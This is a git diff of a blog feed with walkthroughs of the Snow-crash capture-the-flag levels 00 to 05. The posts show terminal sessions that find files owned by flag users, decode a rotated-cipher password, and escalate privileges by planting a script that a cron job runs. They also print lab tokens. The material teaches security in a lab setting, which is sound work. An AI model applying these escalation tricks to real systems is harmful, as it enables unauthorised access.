-dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span>  1 level05 level05  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span>  1 level05 level05 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span>  1 level05 level05  675 Apr  3  2012 .profile
-</code></pre></div></div>
-
-<p>It says that there is a new mail.</p>
-
-<h4 id="4-so-i-found-the-small-hint-from-varmaillevel05">4. So, I found the small hint from /var/mail/level05</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:~<span class="nv">$ </span><span class="nb">cd</span> /var/mail
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 4
-drwxrwsr-x  1 root mail  60 Mar  5  2016 <span class="nb">.</span>
-drwxr-xr-x  1 root root 160 Mar 12  2016 ..
-<span class="nt">-rw-r--r--</span>+ 1 root mail  58 Feb 13 16:49 level05
-</code></pre></div></div>
-
-<p>there is a file <code class="language-plaintext highlighter-rouge">level05</code>.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat </span>level05
-<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> su <span class="nt">-c</span> <span class="s2">"sh /usr/sbin/openarenaserver"</span> - flag05
-</code></pre></div></div>
-<p>So, I was looking for /usr/sbin/openarenaserver and we found a script as below. Let’s take a look inside one by one.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /usr/sbin/openarenaserver
-<span class="c">#!/bin/sh</span>
-
-<span class="k">for </span>i <span class="k">in</span> /opt/openarenaserver/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span> 
-
-	<span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
-	<span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span>
-<span class="k">done</span>
-</code></pre></div></div>
-<p>That means that the script goes through each file in the specified directory, sets a CPU time limit of 5 seconds for its execution, executes the script with debugging output, and then removes the script file.</p>
-
-<p>We can’t and should not put anything inside <code class="language-plaintext highlighter-rouge">/opt/openarenaserver</code> because this directory will be deleted in every 2 minutes, so we should put our file safely in <code class="language-plaintext highlighter-rouge">/tmp</code> file.</p>
-
-<p>We therefore, need to create a bash script in that directory,to get the file and to make sure that the optut is redirected to a file in <code class="language-plaintext highlighter-rouge">/tmp</code>. So, the overall effect of this command is to create a file named <code class="language-plaintext highlighter-rouge">getflag05</code> in the <code class="language-plaintext highlighter-rouge">/opt/openarenaserver/</code> directory.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span>
-getflag <span class="o">&gt;</span> /tmp/flag05
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span> <span class="o">&gt;</span> /opt/openarenaserver/getflag05
-level05@SnowCrash:/usr/sbin<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
-Check flag.Here is your token : viuaaale9huek52boumoomioc
-
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
-Check flag.Here is your token : viuaaale9huek52boumoomioc
-</code></pre></div></div>
-
-<h4 id="5--we-got-a-token-for-next-level06">5.  We got a token for next <code class="language-plaintext highlighter-rouge">level06</code></h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level04</title><link href="http://localhost:4000/cyber-security/Level04/" rel="alternate" type="text/html" title="Snow-crash Level04" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level04</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level04/"><![CDATA[<h4 id="1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of <code class="language-plaintext highlighter-rouge">level04</code> is the token that got from <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42s" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level04</title><link href="http://localhost:4000/ecole42/Level04/" rel="alternate" type="text/html" title="Snow-crash Level04" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level04</id><content type="html" xml:base="http://localhost:4000/ecole42/Level04/"><![CDATA[<h4 id="1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of <code class="language-plaintext highlighter-rouge">level04</code> is the token that got from <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
 </code></pre></div></div>
@@ -659,7 +591,7 @@ Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 <h4 id="6-we-got-a-token-for-next-level05">6. We got a token for next level05</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level03</title><link href="http://localhost:4000/cyber-security/Level03/" rel="alternate" type="text/html" title="Snow-crash Level03" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level03</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level03/"><![CDATA[<h4 id="1-the-password-of-level03-is-the-token-that-got-from-level02">1. The password of <code class="language-plaintext highlighter-rouge">level03</code> is the token that got from <code class="language-plaintext highlighter-rouge">level02</code>.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level03</title><link href="http://localhost:4000/ecole42/Level03/" rel="alternate" type="text/html" title="Snow-crash Level03" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level03</id><content type="html" xml:base="http://localhost:4000/ecole42/Level03/"><![CDATA[<h4 id="1-the-password-of-level03-is-the-token-that-got-from-level02">1. The password of <code class="language-plaintext highlighter-rouge">level03</code> is the token that got from <code class="language-plaintext highlighter-rouge">level02</code>.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
 </code></pre></div></div>
@@ -728,7 +660,7 @@ Check flag.Here is your token :qi0maab88jeaj46qoumi7maus
 <h4 id="7--we-got-a-token-for-next-level04">7.  We got a token for next level04</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level02</title><link href="http://localhost:4000/cyber-security/Level02/" rel="alternate" type="text/html" title="Snow-crash Level02" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level02</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level02/"><![CDATA[<h4 id="1-the-password-of-level02-is-the-token-that-got-from-level01">1. The password of level02 is the token that got from level01.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level02</title><link href="http://localhost:4000/ecole42/Level02/" rel="alternate" type="text/html" title="Snow-crash Level02" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level02</id><content type="html" xml:base="http://localhost:4000/ecole42/Level02/"><![CDATA[<h4 id="1-the-password-of-level02-is-the-token-that-got-from-level01">1. The password of level02 is the token that got from level01.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2av5il02puano7naaf6adaaf
 
@@ -850,7 +782,7 @@ flag02@SnowCrash:~$
 <h4 id="8-we-got-a-token-for-next-level03">8. We got a token for next level03</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level01</title><link href="http://localhost:4000/cyber-security/level01/" rel="alternate" type="text/html" title="Snow-crash Level01" /><published>2023-12-11T00:00:00+09:00</published><updated>2023-12-11T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/level01</id><content type="html" xml:base="http://localhost:4000/cyber-security/level01/"><![CDATA[<h4 id="1-the-password-of-level01-is-the-token-that-got-from-level00">1. The password of level01 is the token that got from level00.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level01</title><link href="http://localhost:4000/ecole42/level01/" rel="alternate" type="text/html" title="Snow-crash Level01" /><published>2023-12-11T00:00:00+09:00</published><updated>2023-12-11T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/level01</id><content type="html" xml:base="http://localhost:4000/ecole42/level01/"><![CDATA[<h4 id="1-the-password-of-level01-is-the-token-that-got-from-level00">1. The password of level01 is the token that got from level00.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> x24ti5gi3x0ol2eh4esiuxias
 </code></pre></div></div>
@@ -997,4 +929,132 @@ flag01@SnowCrash:~$
 </code></pre></div></div>
 <p>Voila ! 😁</p>
 
-<p>See you next level02 !</p>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry></feed>
+<p>See you next level02 !</p>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level00</title><link href="http://localhost:4000/ecole42/Level00/" rel="alternate" type="text/html" title="Snow-crash Level00" /><published>2023-11-29T00:00:00+09:00</published><updated>2023-11-29T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level00</id><content type="html" xml:base="http://localhost:4000/ecole42/Level00/"><![CDATA[<h4 id="1-first-connect-to-ssh-with-your-ip-address-">1. First, connect to ssh with your ip address :</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i ~/.ssh/id_rsa.pub level00@165.22.17.96 -p 4242
+</code></pre></div></div>
+<p>you will see…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   _____                      _____               _
+  / ____|                    / ____|             | |
+ | (___  _ __   _____      _| |     _ __ __ _ ___| |__
+  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
+  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+ |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+  Good luck &amp; Have fun
+
+          46.101.129.15 10.114.0.2
+level00@206.189.251.157's password:
+</code></pre></div></div>
+<h4 id="2--you-will-be-able-to-register-using-the-following-couple-of-loginpassword-level00level00">2.  you will be able to register using the following couple of login:password: level00:level00.</h4>
+
+<p>Then, try to put the command ‘ls’ or ‘ls -la’ to look inside the file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@206.189.251.157's password:
+level00@SnowCrash:~$ ls
+level00@SnowCrash:~$ ls -la
+total 12
+dr-xr-x---+ 1 level00 level00 100 Mar 5 2016 .
+d--x--x--x 1 root users 340 Aug 30 2015 ..
+-r-xr-x---+ 1 level00 level00 220 Apr 3 2012 .bash_logout
+-r-xr-x---+ 1 level00 level00 3518 Aug 30 2015 .bashrc
+-r-xr-x---+ 1 level00 level00 675 Apr 3 2012 .profile
+</code></pre></div></div>
+<h4 id="3-nothing-can-be-found-with-ls-or-ls--la">3. Nothing can be found with ‘ls’ or ‘ls -la’</h4>
+
+<p>Once registered, you’re gonna have to find the password that will log you in with the “flagXX” account(XX = current level number).</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ su flag00
+Password:
+su: Authentication failure
+level00@SnowCrash:~$
+</code></pre></div></div>
+<h4 id="4-so-we-need-to-find-the-account-who-use-flag00-written-in-the-subject-so-try-to-put-the-command-as-below-to-find-the-flag00-in-the-file-type">4. So, we need to find the account who use flag00 (written in the subject). So, try to put the command as below to find the flag00 in the file type.</h4>
+
+<p><code class="language-plaintext highlighter-rouge">find / -type f -user flag00</code></p>
+
+<ol>
+  <li>
+    <p>find / : Starts the search from the root directory. This search will include all directories and subdirecotires</p>
+  </li>
+  <li>
+    <p>-user flag00 : Specifices the search criterion. It looks for files owned by the user with the username “flag00”</p>
+  </li>
+  <li>
+    <p>-exec ls -l {} \;: Executes the ls -l command on each file found. The {} is a placeholder for the current file, and \; signifies the end of the -exec command.</p>
+  </li>
+  <li>
+    <p>2&gt;/dev/null: Redirects standard error (file descriptor 2) to /dev/null, effectively discarding error messages. This is done to suppress error messages related to inaccessible directories or files due to permission issues.</p>
+  </li>
+</ol>
+
+<h4 id="5-there-are-only-2-file-paths-which-doesnt-show-permission-denied-among-the-many-resulting-files">5. There are only 2 file paths which doesn’t show “Permission denied” among the many resulting files.</h4>
+
+<p><code class="language-plaintext highlighter-rouge">/usr/sbin/john</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">/rofs/usr/sbin/john</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>....
+....
+/tmp': Permission denied
+/usr/sbin/john
+find: `/var/cache/ldconfig': Permission denied
+find: `/var/lib/php5': Permission denied
+find: `/var/lib/sudo': Permission denied
+find: `/var/spool/cron/atjobs': Permission denied
+find: `/var/spool/cron/atspool': Permission denied
+find: `/var/spool/cron/crontabs': Permission denied
+find: `/var/tmp': Permission denied
+find: `/var/www/level04': Permission denied
+find: `/var/www/level12': Permission denied
+find: `/rofs/etc/chatscripts': Permission denied
+find: `/rofs/etc/ppp/peers': Permission denied
+find: `/rofs/etc/ssl/private': Permission denied
+find: `/rofs/home': Permission denied
+find: `/rofs/root': Permission denied
+/rofs/usr/sbin/john
+find: `/rofs/var/cache/ldconfig': Permission denied
+find: `/rofs/var/lib/php5': Permission denied.
+...
+...
+</code></pre></div></div>
+<h4 id="6-they-possess-the-same-password-as-cdiiddwpgswtgt">6. They possess the same password as cdiiddwpgswtgt</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ cat /usr/sbin/john
+cdiiddwpgswtgt
+level00@SnowCrash:~$ cat /rofs/usr/sbin/john
+cdiiddwpgswtgt
+level00@SnowCrash:~$
+</code></pre></div></div>
+
+<h4 id="7-but-it-was-not-the-correct-password-we-can-possibly-think-maybe-this-password-is-encyrpted-in-this-case-we-need-to-decrypt-them">7. But, it was NOT the correct password. We can possibly think, maybe this password is encyrpted? in this case, we need to decrypt them.</h4>
+
+<p>ROT 13?</p>
+
+<p>Letter substitution cipher
+ROT are short for Rotate
+Each letter in alphabet has a numeric position(1-26)
+A = position 1
+B = position 2
+Z = position 26 (last position)
+Rotate : Replaces each word with the 13th letter after it
+After position(p) greater than 26, letters reset to p-26
+ROT13 Reverse Translation</p>
+
+<p>Alphabet position -13
+if this value is negative, then substract the absolute value of it from 26
+This is the new position</p>
+
+<p>https://www.dcode.fr/chiffre-rot</p>
+
+<p>So I tried to use the first decrypted result (ROT 15), so that’s how we got the result(password) for get the token Level01!</p>
+
+<p><code class="language-plaintext highlighter-rouge">nottoohardhere</code></p>
+
+<h4 id="8-voila--with-getflag-command-we-got-a-token-for-next-level01">8. Voila ! with getflag command, we got a token for next level01!</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~$ su flag00
+Password:
+Don't forget to launch getflag !
+flag00@SnowCrash:~$ getflag
+Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
+flag00@SnowCrash:~$
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry></feed>
